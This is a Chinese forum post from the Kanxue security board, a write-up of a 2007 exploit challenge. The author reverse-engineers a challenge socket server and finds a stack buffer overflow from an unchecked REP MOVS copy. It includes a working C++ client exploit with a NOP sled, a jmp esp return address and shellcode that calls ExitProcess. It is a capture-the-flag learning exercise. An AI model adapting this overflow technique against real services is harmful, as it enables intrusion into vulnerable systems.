
# [旧帖][原创]07年看雪exploit me 挑战赛-题目A-SCARIN答题（申请邀请码）0.00雪花

去年看《windows核心编程》的时候，书中提到过利用（栈）溢出漏洞攻击系统，当时就在思考是如何利用（栈）溢出漏洞，因为我自己实在是想不通，既然一个程序或OS都溢出了，那岂不肯定就崩溃了，程序或OS都崩溃了，那攻击者利用什么？

昨天遵循着看雪`failwest`的几个帖子，手把手的学习了一下如何利用栈溢出植入自己的`shellcode`，手一直痒痒想找点什么 `exploit`，正好看到07年看雪的一个`exploit`竞赛题目，花费了大概三个小时，我也成功解决了这道题目。下面是我的解题过程。

先拿到题目A，名字是`exploit_me_A.exe`，题目说明这是个服务器，我第一感觉这应该跟`socket`有关，果不其然，我用`ollydbg`加载之后，搜索一下字符串，没想到居然就寥寥无几的几个字符串，一看就知道是什么了

![](https://bbs.kanxue.com/upload/attach/201007/251179_jzbg2pnr39v2hmg.jpg)

`socket`编程我也研究过好些天，看到这几个字符串，我马上明白这是个什么服务器，跳回汇编代码，大概浏览一下代码，发现这个服务器的创建过程就是一个`socket`服务器创建过程（之前我可是花费好久时间研究过服务器与客户端`socket`编程）

## 程序的大致流程如下

1. 创建`socket`服务器，端口号是`7777`（见汇编代码中的`ntohs`中的参数`0x1e61`），等待客户端连接
2. 连接成功后，等待接收数据，每次接收`512`字节
3. 接收成功后会将接收的字符串`copy`到一块内存当中（这段是我经过n次挫折才搞明白的），然后打印出来。

第三步我花了一段时间才发现的，先说一下我解题的整个过程，其实也就是整个思考过程。

在我大致的弄明白程序的流程之后（1~2步骤，这时候还没发现第三步），我马上自己写了一个客户端程序，并猜测我可以向服务器发送一个大于`512`字节的字符串，然后让这个服务器接收这个字符串时栈溢出。我精心的编写了一个大小为`522`字节的字符串，并发送给服务器，发现服务器崩溃了，但没有执行我`shellcode`（我的`shellcode`作用是直接退出程序）。经过多次调试，我发现我这个想法是有错误的，因为`recv`函数压根就不会出现问题，无论我发送多大的字符串，`recv`函数就只接收`512`个，所以我写的`522`字节的字符串，服务器压根就接收不到大于`512`之后的那几个最关键的数据！现在回想起来，自己的这个想法是多么的愚蠢！

但有一个是肯定的，服务器不能接收`512`个字符串，因为我发送过去之后，服务器`cash`了！ 一定有什么地方出现的字符串拷贝的操作。我重新观察了一下`recv`附近的代码，发现`recv`成功之后只调用了一个函数，然后就直接返回，见下图：

![](https://bbs.kanxue.com/upload/attach/201007/251179_xz3xnkzvp4agfi4.jpg)

调试跟踪发现，传入的参数就是刚刚接收到的字符串地址。崩溃是发生在这个函数调用完成之后，那么可以猜测这里面肯定有字符串拷贝操作。`F7`跟进查看，下面是`exploit_.00401000`函数的部分代码：

![](https://bbs.kanxue.com/upload/attach/201007/251179_64rthxfqem4qz67.jpg)

注意红色框框的地方`REP MOVS DWORD PTR ES:[EDI],DWORD PTR DS:[ESI]`，这个操作是将地址为`ESI`的数据刷到地址为`EDI`处，而上面有几条代码会算出`ESI`数据的大小（存放在`EAX`）。这应该就是服务器程序的漏洞。我去研究一下`EDI`所存放的地址，那么如果我的字符串长度够大，那么肯定会淹没到当`00401000`要返回时要执行的代码指令（忘记叫什么了）。再继续寻找`EDI`的最大长度，让服务器程序正常运行到`RETN`，看一下当前堆栈信息，指向了`0012fbb8`

算一下`EDI`的长度是`0012fbb8 - 0012faf0 = c8`，也就是大小为`200`个字节。

那么我只需要构建一个大于`200`字节的字符串，并在`201`处写入`jmp esp`的机器指令就可以植入我自己的`shellcode`了！下面是我写的客户端程序，其中`comd`字符串是用来攻击服务器的，注意在`comd[200]`处开始是`jmp esp`（我的计算机上的地址），我的`shellcode`是用来直接退出服务器的，调用了系统的`ExitProcess`。

```
#include <iostream>
#include <windows.h>
#pragma comment(lib,"ws2_32.lib")
using namespace std;
int main()
{
WSADATA wsa;
WSAStartup(MAKEWORD(2,2),&wsa);
SOCKET sockClient=socket(AF_INET,SOCK_STREAM,0);
SOCKADDR_IN addrSrv;
addrSrv.sin_addr.S_un.S_addr=inet_addr("127.0.0.1");
addrSrv.sin_family=AF_INET;
addrSrv.sin_port=htons(7777);
if(SOCKET_ERROR==connect(sockClient,(SOCKADDR*)&addrSrv,sizeof(SOCKADDR)))
{
  cout << "施主！服务器还没建立呢！- -！" << endl;
  cout << "30分之一的一炷香时间后开始重连" << endl;
  for(int i=0; i<30; i++)
  {
   Sleep(1000);
   cout << ">";
  }
  cout << endl;
  return main();
}
cout << "connect to 127.0.0.1" << endl;
char comd[212];
memset(comd, '\x90', 211);
char c_comd[123];
comd[200] = '\x79';
comd[201] = '\x5b';
comd[202] = '\xe3';
comd[203] = '\x77';
//53
//b8 12cb817c
//ffd0
comd[204] = '\x53';
comd[205] = '\xb8';
comd[206] = '\x12';
comd[207] = '\xcb';
comd[208] = '\x81';
comd[209] = '\x7c';
comd[210] = '\xff';
comd[211] = '\xd0';
while(1)
{
  memset(c_comd, 0, 123);
  cin >> c_comd;
  if(strcmp(c_comd, "exit")==0)
   break;
  if (strcmp(c_comd,"a")==0)
   send(sockClient, comd, 212, 0);
  else
   send(sockClient, c_comd, 123, 0);
}
WSACleanup();
return 0;
}
```

题目A的程序：

[exploit_me_A.zip](https://bbs.kanxue.com/attach-download-45627.htm)

## 总结一下

这道题目能这么快做出来（大概用了三个小时），我自己都有点吃惊，其实很多偶然的因素，刚好自己研究过`socket`，刚好见过用汇编指令拷贝数据。可惜这道挑战赛题目是07年的- -，如果是今年的，那我......

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

上传的附件：

- [http_imgload.cgi.jpg](javascript:void(0);)
  （105.52kb，53次下载）
- [http_imgload.cgi (1).jpg](javascript:void(0);)
  （100.46kb，52次下载）
- [http_imgload.cgi (2).jpg](javascript:void(0);)
  （121.85kb，51次下载）
- [exploit_me_A.zip](javascript:void(0);)
  （16.02kb，10次下载）
